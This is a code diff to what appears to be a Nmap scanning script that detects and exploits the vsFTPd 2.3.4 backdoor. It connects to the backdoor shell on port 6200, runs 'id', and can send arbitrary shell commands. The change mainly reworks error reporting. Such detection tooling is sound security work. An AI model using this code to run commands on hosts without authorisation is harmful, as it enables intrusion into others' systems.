@@ -84,9 +84,7 @@ local function check_backdoor(host, shell_cmd, vuln)
 
   local status, ret = socket:connect(host, 6200, "tcp")
   if not status then
-    stdnse.debug3("can't connect to tcp port 6200: NOT VULNERABLE")
-    vuln.state = vulns.STATE.NOT_VULN
-    return finish_ftp(socket, true)
+    return finish_ftp(socket, false, "can't connect to tcp port 6200")
   end
 
   status, ret = socket:send(CMD_SHELL_ID.."\n")
@@ -102,32 +100,31 @@ local function check_backdoor(host, shell_cmd, vuln)
   end
 
   if not ret:match("uid=") then
-    stdnse.debug3("service on port 6200 is not the vsFTPd backdoor: NOT VULNERABLE")
-    vuln.state = vulns.STATE.NOT_VULN
-    return finish_ftp(socket, true)
-  else
-    if shell_cmd ~= CMD_SHELL_ID then
-      status, ret = socket:send(shell_cmd.."\n")
-      if not status then
-        return finish_ftp(socket, false, "failed to send shell command")
-      end
-      status, ret = socket:receive_lines(1)
-      if not status then
-        return finish_ftp(socket, false,
-          string.format("failed to read shell commands results: %s",
-          ret))
-      end
-    else
-      socket:send("exit\n");
-    end
+    return finish_ftp(socket, false, "service on port 6200 is not the vsFTPd backdoor: NOT VULNERABLE")
   end
 
   vuln.state = vulns.STATE.EXPLOIT
   table.insert(vuln.exploit_results,
-    string.format("Shell command: %s", shell_cmd))
+    string.format("Shell command: %s", CMD_SHELL_ID))
   local result = string.gsub(ret, "^%s*(.-)\n*$", "%1")
   table.insert(vuln.exploit_results,
     string.format("Results: %s", result))
+
+  if shell_cmd ~= CMD_SHELL_ID then
+    status, ret = socket:send(shell_cmd.."\n")
+    if status then
+      status, ret = socket:receive_lines(1)
+      if status then
+        table.insert(vuln.exploit_results,
+          string.format("Shell command: %s", shell_cmd))
+        result = string.gsub(ret, "^%s*(.-)\n*$", "%1")
+        table.insert(vuln.exploit_results,
+          string.format("Results: %s", result))
+      end
+    end
+  end
+
+  socket:send("exit\n");
 
   return finish_ftp(socket, true)
 end
@@ -188,7 +185,8 @@ vsFTPd version 2.3.4 backdoor, this was reported on 2011-07-04.]],
   status, ret = check_backdoor(host, cmd, vsftp_vuln)
   if not status then
     stdnse.debug1("%s", ret)
-    return nil
+    vsftp_vuln.state = vulns.STATE.NOT_VULN
+    return report:make_output(vsftp_vuln)
   end
 
   -- delay ftp socket cleaning
